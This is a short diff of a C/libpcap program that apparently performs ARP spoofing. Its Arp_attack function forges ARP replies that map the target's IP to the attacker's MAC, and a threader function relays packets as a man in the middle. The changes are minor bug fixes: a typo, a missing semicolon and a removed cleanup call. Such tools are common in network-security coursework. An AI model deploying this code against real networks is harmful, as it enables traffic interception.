@@ -150,7 +150,7 @@ int Arp_attack(pcap_t* handle, Args* args)
 	send_packet.arp_.hln_ = Mac::SIZE;
 	send_packet.arp_.pln_ = Ip::SIZE;
 	send_packet.arp_.op_ = htons(ArpHdr::Reply);
-	send_packet.arp_.smac_ = args -> attaker.mac;
+	send_packet.arp_.smac_ = args -> attacker.mac;
 	send_packet.arp_.sip_ = htonl(args -> target.ip);
 	send_packet.arp_.tmac_ = args -> sender.mac;
 	send_packet.arp_.tip_ = htonl(args -> sender.ip);
@@ -255,7 +255,7 @@ void* threader(void* args)
 {
 	Args* trans_arg = (Args*)args;
 	pcap_t* handle = trans_arg -> handle;
-	Edge* sender = &(trans_arg -> sender)
+	Edge* sender = &(trans_arg -> sender);
 	Edge* target = &(trans_arg -> target);
 	Edge* attacker = &(trans_arg -> attacker);
 	if(Target_resolve(handle, sender, attacker) != 0 || Target_resolve(handle, target, attacker) != 0)
@@ -273,7 +273,6 @@ void* threader(void* args)
 		printf("packet relaying fail\n");
 		pthread_exit((void*)1);
 	}
-	pthread_cleanup_pop(0);
 	pthread_exit(NULL);
 }
 
